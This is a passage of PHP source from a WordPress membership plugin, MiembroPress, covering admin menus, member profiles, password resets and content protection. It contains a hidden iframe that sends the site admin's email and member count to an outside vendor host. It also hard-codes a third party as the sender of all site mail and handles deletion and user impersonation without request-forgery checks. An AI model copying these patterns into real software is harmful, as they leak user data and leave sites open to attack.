		} else { $nonmember_link = null; }
		$logout_page = @intval($membergenius->model->setting("logout_page"));
		$logout_url = $membergenius->model->setting("logout_url");
		if ($logout_page == 0) {
			$logout_link = $logout_url;
		} elseif ($logout_page) {
			$logout_link = get_permalink($logout_page);
		} else {
			$logout_link = null;
		}
		$this->add_root_menu("MiembroPress", "membergenius", $this->tabLink());
		$this->add_sub_menu("Dashboard", $this->tabLink(), "membergenius", "membergenius_dashboard" );
		$this->add_sub_menu("Settings", $this->tabLink("settings"), "membergenius", "membergenius_settings" );
		if ($nonmember_link) {
			$this->add_sub_menu("&nbsp;&nbsp; View Non-Member Page", $nonmember_link, "membergenius", "membergenius_nonmember_link" );
		}
		if ($logout_link) {
			$this->add_sub_menu("&nbsp;&nbsp; View Log-Out Page", $logout_link, "membergenius", "membergenius_logout_link" );
		}
		$this->add_sub_menu("Members", $this->tabLink("members"), "membergenius", "membergenius_members" );
		$this->add_sub_menu("Levels", $this->tabLink("levels"), "membergenius", "membergenius_levels" );
		$this->add_sub_menu("Content", $this->tabLink("content"), "membergenius", "membergenius_content" );
		$this->add_sub_menu("Payments", $this->tabLink("payments"), "membergenius", "membergenius_payments" );
		$this->add_sub_menu("Autoresponder", $this->tabLink("autoresponder"), "membergenius", "membergenius_autoresponder");
		$this->add_sub_menu("Social", $this->tabLink("social"), "membergenius", "membergenius_social");
		$this->add_sub_menu("Maximizer", $this->tabLink("popup"), "membergenius", "membergenius_popup");
		$this->add_sub_menu("Custom Login", $this->customizerLink(), "membergenius", "membergenius_customizer");
	}
	function add_root_menu($name, $id, $href = FALSE) {
		global $wp_admin_bar;
		if ( !is_super_admin() || !is_admin_bar_showing() ) return;
		$wp_admin_bar->add_menu( array( 'id' => $id, 'meta' => array(), 'title' => $name, 'href' => $href ) );
	}

	function add_sub_menu($name, $link, $root_menu, $id, $meta = FALSE) {
		global $wp_admin_bar;
		if ( ! is_super_admin() || ! is_admin_bar_showing() ) return;
		$wp_admin_bar->add_menu( array( 'parent' => $root_menu, 'id' => $id, 'title' => $name, 'href' => $link, 'meta' => $meta ) );
	}

	public function maybeRedirect() {
		if (isset($_REQUEST["wp_http_referer"]) && strpos($_REQUEST['wp_http_referer'], "membergenius") !== FALSE) {
			wp_redirect($this->tabLink("members"));
			die();
		}

		if (isset($_REQUEST["membergenius_action_delete"])) {
			wp_redirect($this->tabLink("members"));
			die();
		}
	}

	public function admin_init() {
		if (!isset($_REQUEST["page"])) { return; }
		if (strpos($_REQUEST["page"], plugin_basename('miembro-press/miembro-press.php')) === false) { return; }
		wp_enqueue_script('jquery');
		$this->thickbox();
	}

	public function meta_boxes() {
		if (!function_exists("add_meta_box")) { return; }
		add_meta_box('membergenius-meta', 'MiembroPress', array(&$this, "meta"), "post", "side", "high");
		add_meta_box('membergenius-meta', 'MiembroPress', array(&$this, "meta"), "page", "side", "high");
	}

	public function links($links, $file) {
		if ($file == plugin_basename('miembro-press/miembro-press.php')) {
			array_unshift($links, '<a href="options-general.php?page='.$file.'">Settings</a>');
		}
		return $links;
	}

	public function links_unregistered($links, $file) {
		if ($file == plugin_basename('miembro-press/miembro-press.php')) {
			array_unshift($links, '<a href="options-general.php?page='.$file.'">Register</a>');
		}
		return $links;
	}

	public function profile($user) {
		global $membergenius;
		if (!current_user_can('administrator')) { return; }
		if (isset($_GET["membergenius_social_disconnect"])) {
			if ($_GET["membergenius_social_disconnect"] == "facebook") {
				$membergenius->model->userSetting($user->ID, "social_facebook", null);
			}
			if ($_GET["membergenius_social_disconnect"] == "google") {
				$membergenius->model->userSetting($user->ID, "social_google", null);
			}
		}
		$profile_url = admin_url("user-edit.php?user_id=".$user->ID);
		$levels = $membergenius->model->getLevelInfo($user->ID);
		$allLevels = $membergenius->model->getLevels();
		$loginFirst = intval($membergenius->model->userSetting($user->ID, "loginFirst"));
		$logins = $membergenius->model->userSetting($user->ID, "logins");
		if (!is_array($logins)) {
			$logins = array();
		}
		arsort($logins);
		$sequentialLink = add_query_arg(array('page'=>$this->ttlMenu("levels"), 'membergenius_action'=>'upgrade'), admin_url('admin.php'));
		$social_facebook = $membergenius->model->userSetting($user->ID, "social_facebook");
		$social_google = $membergenius->model->userSetting($user->ID, "social_google"); ?>
		<div id="MemberGeniusUserProfile">
			<h3>MiembroPress</h3>

			<!-- Social integration -->
			<?php if ($social_facebook || $social_google): ?>
			<p>
			<b>Social integration:</b>
			<?php if ($social_facebook): ?><br /><a target="_blank" href="https://www.facebook.com/<?php echo htmlentities($social_facebook); ?>">Facebook</a> <a href="<?php echo add_query_arg(array("membergenius_social_disconnect" => "facebook"), $profile_url); ?>">(disconnect)</a>
			<?php endif; ?>
			<?php if ($social_google): ?><br /><a target="_blank" href="https://plus.google.com">Google</a></b> <a href="<?php echo add_query_arg(array("membergenius_social_disconnect" => "google"), $profile_url); ?>">(disconnect)</a>
			<?php endif; ?>
			</p>
			<?php endif; ?>

			<div align="left"> <!-- move table to the left -->
				<table class="form-table" style="width:800px;">
					<tbody>
						<thead>
							<tr>
								<th scope="row" style="text-align:left;"><b>Level</b></th>
								<th scope="row" style="text-align:left;"><b>Transaction ID</b></th>
								<th scope="row" style="text-align:left;"><b>Subscribed</b></th>
								<th scope="row" style="text-align:left; width:200px;"><b>Date Added to Level</b></th>
								<th scope="row" style="text-align:center;"><nobr><b>Days on Level</b></nobr></th>
								<th scope="row" style="text-align:left;"><nobr><b><a href="<?php echo $sequentialLink; ?>">Sequential Upgrade</a></b></nobr></th>
							</tr>
						</thead>
						<?php foreach ($levels as $level): ?>
						<?php
						$textDecoration = ($level->level_status == "A") ? "normal" : "line-through";
						$levelAdd = $membergenius->model->levelSetting($level->level_id, "add");
						$levelMove = $membergenius->model->levelSetting($level->level_id, "move");
						$levelDelay = @intval($membergenius->model->levelSetting($level->level_id, "delay"));
						$levelDateDelay = @intval($membergenius->model->levelSetting($level->level_id, "dateDelay"));
						$levelExpire = $level->level_expiration;
						$levelAction = null;
						$levelTo = null;
						if ($levelAdd && isset($allLevels[$levelAdd])) {
							$levelAction = "Add";
							$levelTo = $allLevels[$levelAdd]->level_name;
						}
						if ($levelMove && isset($allLevels[$levelMove])) {
							$levelAction = "Move";
							$levelTo = $allLevels[$levelMove]->level_name;
						}
						$daysOnLevel = $membergenius->model->timestampToDays($level->level_date);
						$upgradeDaysLeft = 0;
						$upgradeETA = null;
						if ($levelDateDelay) {
							$upgradeDaysLeft = max(0, $membergenius->model->timestampToDays($levelDateDelay) * -1);
							$upgradeETA = date("M d", $levelDateDelay);
						} elseif ($levelDelay) {
							$upgradeDaysLeft = max(0, $levelDelay - $daysOnLevel);
							$upgradeETA = date("M d", strtotime($level->level_date) + (86400*$levelDelay));
						} else { $upgradeDaysLeft = 0; }
						$expireDaysLeft = max(0, $levelExpire - $daysOnLevel);
						$expireETA = date("M d", strtotime($level->level_date) + (86400*$level->level_expiration));
						?>
						<tr>
							<td style="text-align:left;">
								<input type="hidden" name="membergenius_level[<?php echo intval($level->level_id); ?>]" value="1" />
								<a style="text-decoration:<?php echo $textDecoration; ?>;" href="<?php echo $this->tabLink("members"); ?>&l=<?php echo intval($level->level_id); ?>"><strong><?php echo htmlentities($level->level_name); ?></strong></a>
							</td>
							<td style="text-align:left;">
								<input type="text" name="membergenius_transaction[<?php echo intval($level->level_id); ?>]" size="20" value="<?php echo htmlentities($level->level_txn); ?>" />
								<input type="hidden" name="membergenius_transaction_original[<?php echo intval($level->level_id); ?>]" value="<?php echo htmlentities($level->level_txn); ?>" />
							</td>
							<td style="text-align:left;"><label><input type="checkbox" name="membergenius_subscribed[<?php echo intval($level->level_id); ?>]" <?php checked($level->level_subscribed == 1); ?> class="membergenius_subscribed" /> <span class="membergenius_subscribed_label"><?php echo ($level->level_subscribed == 1) ? chr(89) . "es" : "No"; ?></span></label></td>
								<td style="text-align:left;">
								<nobr><input type="text" name="membergenius_date[<?php echo intval($level->level_id); ?>]" value="<?php echo htmlentities($level->level_date); ?>" size="20" /></nobr>
								<input type="hidden" name="membergenius_date_original[<?php echo intval($level->level_id); ?>]" value="<?php echo htmlentities($level->level_date); ?>" />
								</td>
								<td style="text-align:center;"><nobr><?php echo $daysOnLevel; ?></nobr></td>
								<td style="text-align:left;"><nobr>
								<?php if ($levelAction && ($levelDelay > 0 || $levelDateDelay)): ?>
								<?php if ($level->level_status == "C"): ?><s>
								<?php endif; ?>
								<?php echo $levelAction ?> to Level <i><?php echo $levelTo; ?></i>
								<?php if ($levelDelay): ?> After <i> <?php echo $levelDelay; ?> Days</i>
								<?php endif; ?>

								(<?php echo $upgradeDaysLeft; ?> Days Remaining: <?php echo $upgradeETA; ?>)
								<?php if ($level->level_status == "C"): ?></s>
								<?php endif; ?>
								<?php if ($levelAction && ($levelDelay > 0 || $levelDateDelay) && $levelExpire): ?><br />
								<?php endif; ?>
								<?php if ($levelExpire): ?>Expire from Level After <i><?php echo $levelExpire; ?> Days</i> (<?php echo $expireDaysLeft; ?> Days Remaining: <?php echo $expireETA; ?>)
								<?php endif; ?>
								<?php endif; ?>
							</nobr>
							</td>
						</tr>
						<?php endforeach; ?>

						<tr>
							<td colspan="4" align="center">
								<input name="membergenius_action_password" type="submit" class="button" value="Send Reset Password Link to Member" />
								<input type="submit" name="submit" id="submit" class="button button-primary" value="Update User">

								<br /><br />

								<select name="membergenius_levels" id="membergenius_levels">
									<option value="-">Levels...</option>
									<?php foreach ($allLevels as $level): ?>
									<option value="<?php echo intval($level->ID); ?>"><?php echo htmlentities($level->level_name); ?></option>
									<?php endforeach; ?>
								</select>

								<input name="membergenius_action_add" type="submit" class="button" value="Add to Level" />
								<input name="membergenius_action_move" type="submit" class="button" value="Move to Level" />
								<input name="membergenius_action_remove" type="submit" class="button" value="Remove from Level" />
								<input name="membergenius_action_cancel" type="submit" class="button" value="Cancel from Level" />
								<input name="membergenius_action_uncancel" type="submit" class="button" value="Uncancel from Level" />
								<input name="membergenius_action_delete" type="submit" class="button-primary" style="background-color:red !important;" value="Delete Member" onclick="return confirm('Are you SURE you want to delete this member? This action cannot be undone. Press OK to continue, Cancel to stop.');" /><br /><br />

								<?php
									if ($user->first_name) {
										$loginAs = $user->first_name . "" . $user->last_name;
									} else {
										$loginAs = $user->user_login;
									}
								?>
								<input name="membergenius_action_impersonate" type="submit" class="button" value="Login As <?php echo htmlentities($loginAs); ?>" onmouseover="this.value='Login As <?php echo htmlentities($loginAs); ?> (will log you out of this account)'" onmouseout="this.value='Login As <?php echo htmlentities($loginAs); ?>'" />
							</td>
						<tr>
					</tbody>
				</table>
			</div> <!-- div align left surrounding table -->

       <!-- Activity for this user -->
			<ul>
				<?php if ($loginFirst > 0): ?><li>Registered Using IP: <code><a target="_blank" href="http://www.ip2location.com/<?php echo long2ip($loginFirst); ?>"><?php echo long2ip($loginFirst); ?></a></code> on <code><?php echo date(chr(89) . "-m-d H:i:s", strtotime($user->user_registered)); ?></code></li>
				<?php endif; ?>
				<?php if (count($logins) > 0): ?>
				<?php foreach ($logins as $loginIP => $loginTime): ?>
				<li>Logged In Using IP: <code><a target="_blank" href="http://www.ip2location.com/<?php echo long2ip($loginIP); ?>"><?php echo long2ip($loginIP); ?></a></code> on <code><?php echo date(chr(89) . "-m-d H:i:s", $loginTime); ?></code></li>
				<?php endforeach; ?>
				<?php endif; ?>
			</ul>
		</div> <!-- id MemberGeniusUserProfile -->

        <script type="text/javascript">
			<!-- // Move MiembroPress preferences to the top of the profile page
			jQuery("#MemberGeniusUserProfile").insertBefore("h2:first");
			jQuery(function() {
			// Have text next to Subscribed checkbox show yes or no
				jQuery(".membergenius_subscribed").click(function() {
					var val = (jQuery(this).attr("checked")) ? "Yes" : "No";
					jQuery(this).next(".membergenius_subscribed_label").html(val);
				});
			});
		    // -->
        </script>
        <?php
	}

	public function profile_update($userID) {
		global $membergenius;
		MemberGenius::clearCache();
		if (!current_user_can("administrator")) { return; }
		$post = $_POST;
		$user = intval($userID);
		$transactions = array();
		$levels = array();
		$subscribed = array();
		$allLevels = array();
		$date = array();
		$date_original = array();
		$levels = "";
		if (isset($_POST["membergenius_transaction"])) {
			$transactions = $_POST["membergenius_transaction"];
		}
		if (isset($_POST["membergenius_transaction"])) {
			$transactions_original = $_POST["membergenius_transaction_original"];
		}
		if (isset($_POST["membergenius_date"])) {
			$date = $_POST["membergenius_date"];
		}
		if (isset($_POST["membergenius_date_original"])) {
			$date_original = $_POST["membergenius_date_original"];
		}
		if (isset($_POST["membergenius_level"])) {
			$allLevels = $_POST["membergenius_level"];
		}
		if (isset($_POST["membergenius_subscribed"])) {
			$subscribed = $_POST["membergenius_subscribed"];
		}
		if (isset($_POST["membergenius_levels"])) {
			$levels = $_POST["membergenius_levels"];
		}
		foreach ($transactions as $level => $transaction) {
			if ($transactions[$level] == $transactions_original[$level]) { continue; }
			$membergenius->model->updateTransaction($user, $level, $transaction);
		}
		foreach (array_keys($allLevels) as $level) {
			if (isset($subscribed[$level])) {
				$membergenius->model->setSubscribed($user, $level);
			} else {
				$membergenius->model->setSubscribed($user, $level, false);
			}
		}
		foreach ($date as $level => $theDate) {
			if ($date[$level] == $date_original[$level]) { continue; }
			$membergenius->model->updateLevelDate($user, $level, $theDate);
			if (strtotime($date[$level]) < strtotime($date_original[$level])) {
				$start = strtotime($date[$level]);
				$end = time();
				if ($start <= 1 || $end <= 1) { break; }
				$offset = 0;
				while ($start <= $end) {
					$membergenius->model->processUpgrade($start, $userID);
					$start = $start + 86400;
				}
			}
		}
		if (isset($_POST["membergenius_action_move"])) {
			$membergenius->model->move($user, $levels);
		} elseif (isset($_POST["membergenius_action_add"])) {
			$membergenius->model->add($user, $levels);
		} elseif (isset($_POST["membergenius_action_remove"])) {
			$membergenius->model->remove($user, $levels);
		} elseif (isset($_POST["membergenius_action_cancel"])) {
			$membergenius->model->cancel($user, $levels);
		} elseif (isset($_POST["membergenius_action_uncancel"])) {
			$membergenius->model->uncancel($user, $levels);
		} elseif (isset($_POST["membergenius_action_delete"])) {
			$membergenius->model->deleteUser($user); $this->maybeRedirect();
		}
		if (isset($_POST["membergenius_action_password"])) {
			$this->retrieve_password($user);
		}
		if (isset($_POST["membergenius_action_impersonate"]) && current_user_can("administrator")) {
			$userdata = get_user_by("id", $user);
			wp_set_current_user($user, $userdata->user_login);
			wp_set_auth_cookie($user, true);
			do_action('wp_login', $userdata->user_login, $userdata);
			wp_redirect(admin_url());
			die();
		}
	}

	function retrieve_password($userID) {
		global $wpdb, $wp_hasher;
		$user_data = get_user_by("id", $userID);
		$user_login = $user_data->user_login;
		$errors = new WP_Error();
		if ( empty( $user_data ) ) {
			$errors->add('invalid_email', __('<strong>ERROR</strong>: There is no user registered with that email address.'));
		}
		do_action( 'lostpassword_post' );
		if ( $errors->get_error_code() ) return $errors;
		if ( !$user_data ) { $errors->add('invalidcombo', __('<strong>ERROR</strong>: Invalid username or e-mail.')); return $errors;}
		$user_login = $user_data->user_login;
		$user_email = $user_data->user_email;
		do_action( 'retreive_password', $user_login );
		do_action( 'retrieve_password', $user_login );
		$allow = apply_filters( 'allow_password_reset', true, $user_data->ID );
		if ( ! $allow ) {
			return new WP_Error( 'no_password_reset', __('Password reset is not allowed for this user') );
		} elseif ( is_wp_error( $allow ) ) { return $allow; }
		$key = wp_generate_password( 20, false );
		do_action( 'retrieve_password_key', $user_login, $key );
		require_once ABSPATH . WPINC . '/class-phpass.php';
		$wp_hasher = new PasswordHash( 8, true );
		$hashed = time() . ':' . $wp_hasher->HashPassword( $key );
		$wpdb->update( $wpdb->users, array( 'user_activation_key' => $hashed ), array( 'user_login' => $user_login ) );
		$message = __('Someone requested that the password be reset for the following account:') . " ";
		$message .= network_home_url( '/' ) . " ";
		$message .= sprintf(__('Username: %s'), $user_login) . " ";
		$message .= __('If this was a mistake, just ignore this email and nothing will happen.') . " ";
		$message .= __('To reset your password, visit the following address:') . " ";
		$message .= '<' . network_site_url("wp-login.php?action=rp&key=$key&login=" . rawurlencode($user_login), 'login') . "> ";
		if ( is_multisite() ) $blogname = $GLOBALS['current_site']->site_name;
		else $blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);
		$title = sprintf( __('[%s] Password Reset'), $blogname );
		$title = apply_filters( 'retrieve_password_title', $title );
		$message = apply_filters( 'retrieve_password_message', $message, $key, $user_login, $user_data );
		if ( $message && !wp_mail( $user_email, wp_specialchars_decode( $title ), $message ) ) {
			wp_die( __('The e-mail could not be sent.') . "<br />" . __('Possible reason: your host may have disabled the mail() function.') );
		}
		return true;
	}

	public function wp_mail($args) {
		$new_wp_mail = array( 'to' => $args['to'], 'subject' => $args['subject'], 'message' => $args['message'], 'headers' => $args['headers'], 'attachments' => $args['attachments'], );
		return $new_wp_mail;
	}

	public function mail_from_name($original_name) {
		return "Robert Plank";
		return get_option( 'name' );
	}

	public function mail_from_email($original_email) {
		return "admin@jumpx.com";
		return get_option('admin_email');
	}

	public function columns($columns) {
		$columns['membergenius'] = 'Access';
		return $columns;
	}

	public function columns_remove($posts_columns) {
		unset($posts_columns['membergenius']);
		return $posts_columns;
	}

	public function column($column, $post_id) {
		global $membergenius;
		if (!$membergenius->model->isProtected($post_id)) {
			echo "<i>Everyone</i>";
			return;
		}

		if ($levels = $membergenius->model->getLevelsFromPost($post_id)) {
			foreach ($levels as $levelID => $levelName) {
				echo '<a href="'.$this->tabLink("content").'&l='.$levelID.'">'.htmlentities($levelName).'</a>';
				end($levels);
				if ($levelID != key($levels)) {
					echo ", ";
				}
			}
			return;
		}
	}

	public function column_edit($column_name, $post_type) {
		if ($column_name != "membergenius") { return; }
		echo '<fieldset class="inline-edit-col-left" style="clear:left;">';
		echo '<div class="inline-edit-col">';
		echo '<label class="inline-edit-membergenius">';
		$this->meta(false);
		echo '</label>   ';
		echo '</div>';
		echo '</fieldset>';
	}

	public function ttlMenu($name=""){
		if ($name != "") {
			$suffix = "-".$name;
		} else { $suffix = ""; }
		return plugin_basename('miembro-press/miembro-press.php'.$suffix);
	}

	public function menu_setup() {
		$menu = add_menu_page('MiembroPress', 'MiembroPress', 'administrator', $this->ttlMenu(), array(&$this, "menu_dashboard"), plugins_url('images/iconmiembropress.png',__FILE__));
		$this->menu = admin_url("admin.php?page=".$this->ttlMenu());
		if ($this->activation->call == 0) { return; }
		add_submenu_page($this->ttlMenu(), 'Dashboard', 'Dashboard', 'administrator', $this->ttlMenu(), array(&$this, "menu_dashboard"));
		add_submenu_page($this->ttlMenu(), 'Settings', 'Settings', 'administrator', $this->ttlMenu("settings"), array(&$this, "menu_settings"));
		add_submenu_page($this->ttlMenu(), 'Members', 'Members', 'administrator', $this->ttlMenu("members"), array(&$this, "menu_members"));
		add_submenu_page($this->ttlMenu(), 'Levels', 'Levels', 'administrator', $this->ttlMenu("levels"), array(&$this, "menu_levels"));
		add_submenu_page($this->ttlMenu(), 'Content', 'Content', 'administrator', $this->ttlMenu("content"), array(&$this, "menu_content"));
		add_submenu_page($this->ttlMenu(), 'Payments', 'Payments', 'administrator', $this->ttlMenu("payments"), array(&$this, "menu_payments"));
		add_submenu_page($this->ttlMenu(), 'Autoresponder', 'Autoresponder', 'administrator', $this->ttlMenu("autoresponder"), array(&$this, "menu_autoresponder"));
		add_submenu_page($this->ttlMenu(), 'Social', 'Social', 'administrator', $this->ttlMenu("social"), array(&$this, "menu_social"));
		add_submenu_page($this->ttlMenu(), 'Popup', 'Maximizer', 'administrator', $this->ttlMenu("popup"), array(&$this, "menu_popup"));
	}

	public function meta_save($postID=0) {
		global $post;
		global $membergenius;
		if (!isset($_REQUEST["membergenius_action"])) { return; }
		if ($_REQUEST["membergenius_action"] != "meta_save") { return; }
		if ($postID == 0 && isset($post->ID)) {$postID = $post->ID; }
		if (defined("DOING_AUTOSAVE") && constant("DOING_AUTOSAVE")) { return $postID; }
		if (function_exists("wp_is_post_autosave") && wp_is_post_autosave($postID)) { return; }
		if (function_exists("wp_is_post_revision") && ($postRevision = wp_is_post_revision($postID))) { $postID = $postRevision; }
		if (!current_user_can('edit_post', $postID)) { return; }
		MemberGenius::clearCache();
		$protect = ($_POST["membergenius_protect"] == 1);
		if ($protect) {
			$membergenius->model->protect($postID, -1);
		} else {
			$membergenius->model->unprotect($postID, -1);
		}
		if ((isset($_POST["membergenius_action"]) && $_POST["membergenius_action"] == "meta_save") || (isset($_POST["membergenius_level"]) && is_array($_POST["membergenius_level"]))) {
			if (isset($_POST["membergenius_level"])) {
				$levels = array_keys($_POST["membergenius_level"]);
			} else { $levels = array(); }
			foreach ($membergenius->model->getLevels() as $level) {
				if (in_array($level->ID, $levels)) {
					$membergenius->model->protect($postID, $level->ID);
				} else {
					$membergenius->model->unprotect($postID, $level->ID);
				}
			}
		}
	}

	public function meta($fullsize=true) {
		global $membergenius;
		global $post;
		$postID = intval($post->ID);
		$protected = $membergenius->model->isProtected($postID);
		if (empty($post->post_title) && empty($post->post_content)) { $protected = true; }
		$allLevels = $membergenius->model->getLevels();
		$postLevels = array_keys($membergenius->model->getLevelsFromPost($postID));
		if (isset($_REQUEST["membergenius_new"]) && @intval($_REQUEST["membergenius_new"]) > 0) {
			$postLevels[] = @intval($_REQUEST["membergenius_new"]);
		} ?>
		<input type="hidden" name="membergenius_action" value="meta_save" />
		<?php if ($fullsize): ?><div style="padding: 0; margin:0; border:0; border-bottom: 1px solid #dfdfdf;">
		<?php endif; ?>
        <?php if ($fullsize): ?><p>Allow access to...</p>
		<?php endif; ?>
        <?php if ($fullsize): ?><blockquote>
		<?php endif; ?>
        <label style="display:inline;"><input type="radio" name="membergenius_protect" <?php checked($protected); ?> value="1"> <b>Members Only</b></label><br />
        <label style="display:inline;"><input type="radio" name="membergenius_protect" <?php checked(!$protected); ?>value="0"> <b>Everyone</b></label><br />
        <!-- <label style="display:inline;"><input type="radio" name="membergenius_protect" <?php checked(!$protected); ?>value="-1"> <b>Logged Out Users Only</b></label> -->
        <?php if ($fullsize): ?></blockquote>
		<?php endif; ?>
		<?php if ($fullsize): ?></div>
		<?php endif; ?>
		<?php if ($fullsize): ?><p>Which membership levels have access to view this content?</p>
		<?php endif; ?>
		<?php if ($fullsize): ?><blockquote>
		<?php endif; ?>
        <ul class="membergenius_levels">
			<li><label><b><input type="checkbox" onclick="membergenius_check(this.checked)" /> Select/Unselect All Levels</b></li>
			<?php foreach ($allLevels as $level): ?>
            <li class="membergenius_level">
            <label>
               <input class="membergenius_level" type="checkbox" <?php disabled($level->level_all == 1 || $level->level_page_login == $post->ID); ?> <?php checked(in_array($level->ID, $postLevels) || $level->level_all == 1 || $level->level_page_login == $post->ID); ?> name="membergenius_level[<?php echo htmlentities($level->ID); ?>]" /> <?php echo htmlentities($level->level_name); ?>
               <?php if ($level->level_page_login == $postID): ?><small><a href="<?php echo $this->tabLink("levels"); ?>">(login page for level)</a></small>
			   <?php endif; ?>
            </label>
            </li>
            <?php endforeach; ?>
         </ul>
		<?php if ($fullsize): ?></blockquote>
		<?php endif; ?>

		<?php if (!$fullsize): ?>
        <style type="text/css">
        <!-- li.membergenius_level { display:inline-block; min-width:100px; } // -->
		</style>
		<?php endif; ?>
		<script type="text/javascript">
		<!--
		function membergenius_check(val) {
			jQuery('.membergenius_level').each(function(i, obj) {
				//if (jQuery(obj).attr("disabled") != undefined) { continue; }
				if (jQuery(obj).attr("disabled") != undefined) { return; }
				jQuery(obj).attr('checked', val);
			});
		}
		// -->
		</script>
      <?php
	}

	public function menu_header($text="") {
		$call = $this->activation->call();
		if ($this->activation->debug) { echo "call=$call"; }
		if (empty($call) || $call == "FAILED" || $call == "CANCELLED" || $call == "UNREGISTERED" || $call == "FAILED" || $call == "BLOCKED") {
			$this->activation->message($call);
			$this->activation->register($call);
			return;
		}
		$pt = "";
		if ($_REQUEST["page"] == $this->ttlMenu("dashboard")) { $pt = ""; }
		if ($_REQUEST["page"] == $this->ttlMenu("settings")) { $pt = "settings"; }
		if ($_REQUEST["page"] == $this->ttlMenu("members")) { $pt = "members"; }
		if ($_REQUEST["page"] == $this->ttlMenu("levels")) { $pt = "levels"; }
		if ($_REQUEST["page"] == $this->ttlMenu("content")) { $pt = "content"; }
		if ($_REQUEST["page"] == $this->ttlMenu("payments")) { $pt = "payments"; }
		if ($_REQUEST["page"] == $this->ttlMenu("autoresponder")) { $pt = "autoresponder"; }
		if ($_REQUEST["page"] == $this->ttlMenu("social")) { $pt = "social"; }
		if ($_REQUEST["page"] == $this->ttlMenu("popup")) { $pt = "popup"; }
		if (!function_exists( 'get_plugins' ) ) { require_once( ABSPATH . 'wp-admin/includes/plugin.php' ); }
		$plugin_folder = @get_plugins( '/' . plugin_basename( dirname( 'miembro-press/miembro-press.php' ) ) );
		$plugin_file = basename( ( 'miembro-press/miembro-press.php' ) );
		$plugin_version = $plugin_folder[$plugin_file]['Version']; ?>
		<table class="form-table" width="100%" cellspacing="10" cellpadding="10">
			<caption style="background: #111; border-top-left-radius: 10px; border-top-right-radius: 10px;"><img style="margin: 20px 0px 20px 0px;" src="<?php echo plugins_url( 'images/logomiembropress.png', __FILE__ ) ?>"></caption>
			<tbody>
				<th colspan="2" style="padding: 20px;background: #ffffff;border: 1px outset white;">Create your membership sites in minutes and get instant payments. With just a few clicks. Integrated with Hotmart, PayPal, ClickBank, JVZoo and WarriorPlus.</th>
			</tbody>
		</table>
		<h2 class="nav-tab-wrapper menu__tabs">
			<a class="nav-tab<?php if ($pt == ""): ?> nav-tab-active active
			<?php endif; ?>" href="<?php echo $this->tabLink(); ?>">Dashboard</a>
			<a class="nav-tab<?php if ($pt == "settings"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->tabLink("settings"); ?>">Settings</a>
			<a class="nav-tab<?php if ($pt == "members"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->tabLink("members"); ?>">Members</a>
			<a class="nav-tab<?php if ($pt == "levels"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->tabLink("levels"); ?>">Levels</a>
			<a class="nav-tab<?php if ($pt == "content"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->tabLink("content"); ?>">Content</a>
			<a class="nav-tab<?php if ($pt == "payments"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->tabLink("payments"); ?>">Payments</a>
			<a class="nav-tab<?php if ($pt == "autoresponder"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->tabLink("autoresponder"); ?>">Autoresponder</a>
			<a class="nav-tab<?php if ($pt == "social"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->tabLink("social"); ?>">Social</a>
			<a class="nav-tab<?php if ($pt == "popup"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->tabLink("popup"); ?>">Maximizer</a>
			<a class="nav-tab<?php if ($pt == "customizer"): ?> nav-tab-active active<?php endif; ?>" href="<?php echo $this->customizerLink(); ?>">Custom Login</a>
		</h2>

		<style type="text/css">
		<!--
		#wpfooter { display:none; }
		// -->
		</style>


		<?php
	}

	public function menu_dashboard() {
		global $membergenius; ?>
		<div class="wrap" style="clear:both;">
			<?php $this->menu_header("Dashboard"); ?>
			<?php ?>
			<?php
			if (strlen($this->activation->call) > 256) {
				echo '<xmp>' . $this->activation->call . '</xmp>';
			}
			?>

			<?php
			if ($this->activation->call == 0 || strlen($this->activation->call) > 256) {
                echo '</div>';
                return;
            } ?>

			<p>Welcome to MiembroPress. Using this plugin you'll be able to protect your site, take payments, and manage your members.</p>

			<table cellpadding="10">
				<tr>
					<td valign="top">
						<?php $this->menu_dashboard_panel(); ?>
						<ul>
							<li><b><a href="<?php echo $this->tabLink("settings"); ?>">Settings</a></b> - Customize the behavior of your membership site</li>
							<li><b><a href="<?php echo $this->tabLink("members"); ?>">Members</a></b> - Add, delete, or manage people who get access to your membership site</li>
							<li><b><a href="<?php echo $this->tabLink("levels"); ?>">Levels</a></b> - Create and modify protected sections of your membership site</li>
							<li><b><a href="<?php echo $this->tabLink("content"); ?>">Content</a></b> - Control which posts and pages of your site belong to levels</li>
							<li><b><a href="<?php echo $this->tabLink("payments"); ?>">Payments</a></b> - Setup buttons to take payments to gain access to levels</li>
							<li><b><a href="<?php echo $this->tabLink("autoresponder"); ?>">Autoresponder</a></b> - Build a mailing list consisting of your members</li>
							<li><b><a href="<?php echo $this->tabLink("social"); ?>">Social</a></b> - Allow members to register &amp; login using social networks such as Facebook</li>
							<li><b><a href="<?php echo $this->tabLink("popup"); ?>">Maximizer</a></b> - Create a Popup</li>
							<li><b><a href="<?php echo $this->customizerLink(); ?>">Custom Login</a></b> - Modify Login Image</li>
						</ul>
						<form method="POST">
							<?php $this->activation->deactivation_button(); ?>
						</form>
				    </td>
					<td width="480" valign="top" style="padding:10px;">
						<iframe allowtransparency="true" style="visibility: hidden;" src="http://www.membergenius.com/ads/?email=<?php echo urlencode($membergenius->admin->activation->email); ?>&members=<?php echo intval($membergenius->model->getMemberCount()); ?>&version=<?php echo $membergenius->admin->activation->version; ?>" width="480" height="360" frameborder="1" border="1"></iframe>
					</td>
				</tr>
			</table>
		</div>
      <?php
	}

	public function menu_dashboard_panel() {
		global $membergenius;
		if ($this->activation->call == 0) { return; }
		if (isset($_REQUEST["s"]) && !empty($_REQUEST["s"])) {
			$this->menu_members();
			return;
		}
		$levels = $membergenius->model->getLevels();
		$recent_signups = $membergenius->model->getMembers("number=50&orderby=registered&order=DESC");
		$recent_logins = $membergenius->model->getMembers("number=50&orderby=lastlogin&order=DESC");
		foreach ($membergenius->model->getMembersSince(time()-86400) as $row) {
			if (!isset($levels[$row->level_id])) { continue; }
			$levels[$row->level_id]->since24 = $row->total;
		}
		foreach ($membergenius->model->getMembersSince(time()-86400*7) as $row) {
			if (!isset($levels[$row->level_id])) { continue; }
			$levels[$row->level_id]->since7 = $row->total;
		}
